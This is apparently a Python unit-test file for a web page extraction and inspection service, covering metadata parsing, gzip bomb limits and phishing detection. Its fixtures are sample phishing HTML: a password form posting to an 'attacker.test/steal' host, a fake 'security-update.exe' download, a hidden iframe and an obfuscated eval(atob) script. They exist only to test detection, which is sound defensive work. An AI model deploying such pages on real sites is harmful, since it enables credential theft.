from __future__ import annotations

import gzip
import unittest
from unittest.mock import patch

from backend.app.services import web_content


class _FakeResponse:
    def __init__(self, body: bytes, headers: dict[str, str]) -> None:
        self.status = 200
        self._body = body
        self._offset = 0
        self._headers = {key.lower(): value for key, value in headers.items()}

    def getheader(self, name: str) -> str | None:
        return self._headers.get(name.lower())

    def read(self, amount: int) -> bytes:
        chunk = self._body[self._offset:self._offset + amount]
        self._offset += len(chunk)
        return chunk


class _FakeConnection:
    def __init__(self, response: _FakeResponse) -> None:
        self._response = response

    def request(self, *args, **kwargs) -> None:
        return None

    def getresponse(self) -> _FakeResponse:
        return self._response

    def close(self) -> None:
        return None


class WebContentTests(unittest.TestCase):
    def test_extracts_article_metadata_without_scripts_or_navigation(self) -> None:
        page = b"""<!doctype html><html><head>
        <title>Fallback title</title>
        <meta property="og:title" content="Article title">
        <meta name="description" content="A useful summary">
        <meta name="theme-color" content="#123456">
        <meta property="og:image" content="/cover.jpg">
        <link rel="icon" href="/favicon.ico">
        </head><body>
        <nav>This navigation sentence must never be extracted into article text.</nav>
        <article><h1>Article title</h1><p>This is the readable main article paragraph with enough text to keep.</p></article>
        <script>stealSecrets()</script>
        </body></html>"""
        with (
            patch.object(web_content, "_fetch", return_value=(page, "https://example.com/story", "text/html")),
            patch.object(web_content, "_preview_data", return_value="data:image/jpeg;base64,abc") as preview,
        ):
            result = web_content.extract_web_content("https://example.com/story")

        self.assertEqual(result["title"], "Article title")
        self.assertIn("readable main article", result["content"])
        self.assertNotIn("navigation", result["content"])
        self.assertNotIn("stealSecrets", result["content"])
        self.assertEqual(result["preview_data_url"], "data:image/jpeg;base64,abc")
        self.assertEqual(result["appearance"]["theme_color"], "#123456")
        self.assertEqual(result["appearance"]["favicon_url"], "https://example.com/favicon.ico")
        self.assertTrue(any(
            "This is the readable main article paragraph" in claim
            for claim in result["claims"]
        ))
        preview.assert_called_once_with("https://example.com/cover.jpg")

    def test_extracts_non_article_page_and_builds_claim_candidates(self) -> None:
        page = b"""<html><head><title>Product information page</title></head><body>
        <main><h1>A useful product for small teams</h1>
        <div>Our service has supported more than ten thousand projects since 2020.</div>
        <div>Customers can export every report as a PDF document.</div></main>
        </body></html>"""
        with patch.object(
            web_content, "_fetch", return_value=(page, "https://example.com/product", "text/html")
        ):
            result = web_content.extract_web_content("https://example.com/product")

        self.assertIn("ten thousand projects", result["content"])
        self.assertGreaterEqual(len(result["claims"]), 1)

    def test_rejects_non_html_content(self) -> None:
        with patch.object(
            web_content, "_fetch", return_value=(b"binary", "https://example.com/file", "application/pdf")
        ):
            with self.assertRaises(web_content.ContentFetchError):
                web_content.extract_web_content("https://example.com/file")

    def test_decompresses_gzip_and_rejects_unsafe_compression(self) -> None:
        page = b"<html><body><p>Compressed page content that must be decoded.</p></body></html>"
        compressed = gzip.compress(page)

        self.assertEqual(web_content._decompress_body(compressed, "gzip", 10_000), page)

        with self.assertRaises(web_content.ContentFetchError) as unsupported:
            web_content._decompress_body(compressed, "br", 10_000)
        self.assertEqual(unsupported.exception.status_code, 415)

        with self.assertRaises(web_content.ContentFetchError) as invalid:
            web_content._decompress_body(b"not-gzip", "gzip", 10_000)
        self.assertEqual(invalid.exception.status_code, 502)

        bomb = gzip.compress(b"x" * 20_000)
        with self.assertRaises(web_content.ContentFetchError) as too_large:
            web_content._decompress_body(bomb, "gzip", 100)
        self.assertEqual(too_large.exception.status_code, 413)

    def test_fetch_decodes_compressed_html_and_records_headers(self) -> None:
        page = b"<html><body><p>A gzip response from a real server.</p></body></html>"
        response = _FakeResponse(
            gzip.compress(page),
            {
                "Content-Type": "text/html; charset=utf-8",
                "Content-Encoding": "gzip",
                "Content-Length": str(len(gzip.compress(page))),
                "Content-Security-Policy": "default-src 'self'",
            },
        )
        with patch.object(
            web_content, "_connection", return_value=_FakeConnection(response)
        ):
            fetched = web_content._fetch(
                "https://example.com/compressed",
                accept="text/html",
                max_bytes=10_000,
            )

        self.assertEqual(fetched.body, page)
        self.assertEqual(fetched.headers["content-encoding"], "gzip")
        self.assertEqual(
            fetched.headers["content-security-policy"], "default-src 'self'"
        )
        self.assertEqual(fetched.redirects, [])

    def test_builds_page_dossier_and_flags_phishing_patterns(self) -> None:
        page = b"""<!doctype html><html lang="en"><head>
        <title>Account verification</title>
        <meta name="description" content="Verify your account immediately to avoid suspension. Enter your password and download the security update.">
        <meta property="og:type" content="website">
        <link rel="canonical" href="https://evil.example/login">
        </head><body>
        <article><h1>Account verification required</h1>
        <p>Your account will be suspended unless you verify your identity today. Please sign in below with your password.</p>
        <p>The security team recommends installing the verification tool for Windows.</p>
        <form action="https://collector.attacker.test/steal" method="post">
        <input type="email" name="email"><input type="password" name="password">
        <input type="hidden" name="token" value="x">
        </form>
        <a href="/security-update.exe" download>Download security update</a>
        <a href="/notice.pdf">Read the report</a>
        <iframe src="https://ads.example/frame" style="display:none"></iframe>
        </article>
        <script>eval(atob("YWxlcnQoMSk="));</script>
        </body></html>"""
        redirects = [{
            "status": 301,
            "from": "https://short.example/go",
            "to": "https://evil.example/login",
            "cross_host": True,
        }]
        fetched = web_content.FetchResult(
            body=page,
            final_url="https://evil.example/login",
            content_type="text/html",
            headers={"content-security-policy": "default-src 'self'"},
            redirects=redirects,
        )
        with patch.object(web_content, "_fetch", return_value=fetched):
            result = web_content.extract_web_content("https://short.example/go")

        inspection = result["inspection"]
        findings = inspection["findings"]
        finding_ids = {finding["id"] for finding in findings}

        self.assertEqual(
            result["summary"]["brief"],
            "Verify your account immediately to avoid suspension. "
            "Enter your password and download the security update.",
        )
        self.assertEqual(inspection["page_type"], "Login / account page")
        self.assertEqual(inspection["risk_level"], "high")
        self.assertEqual(inspection["redirects"], redirects)
        self.assertEqual(result["fetch"]["redirects"], redirects)
        self.assertTrue(
            inspection["security_headers"]["content-security-policy"]["present"]
        )

        form = inspection["forms"][0]
        self.assertEqual(form["method"], "post")
        self.assertTrue(form["password_field"])
        self.assertTrue(form["external_action"])
        self.assertIn("password", form["sensitive_fields"])

        self.assertEqual(len(inspection["downloads"]), 2)
        download_findings = [
            finding for finding in findings if finding["id"] == "download_link"
        ]
        self.assertEqual(len(download_findings), 1)
        self.assertEqual(download_findings[0]["severity"], "high")
        self.assertEqual(len(download_findings[0]["evidence"]), 2)
        self.assertIn("external_password_form", finding_ids)
        self.assertIn("hidden_frame", finding_ids)
        self.assertIn("obfuscated_javascript", finding_ids)

    def test_known_tracker_frame_and_void_links_are_informational(self) -> None:
        page = b"""<html><body>
        <p>This page contains enough visible text to be summarized safely.</p>
        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-X" style="display:none"></iframe>
        <a href="javascript:void(0);">Open menu</a>
        </body></html>"""
        with patch.object(
            web_content,
            "_fetch",
            return_value=(page, "https://example.com/page", "text/html"),
        ):
            result = web_content.extract_web_content("https://example.com/page")

        findings = result["inspection"]["findings"]
        self.assertEqual([finding["id"] for finding in findings], ["tracking_frame"])
        self.assertEqual(findings[0]["severity"], "info")
        self.assertEqual(result["inspection"]["risk_level"], "low")


if __name__ == "__main__":
    unittest.main()
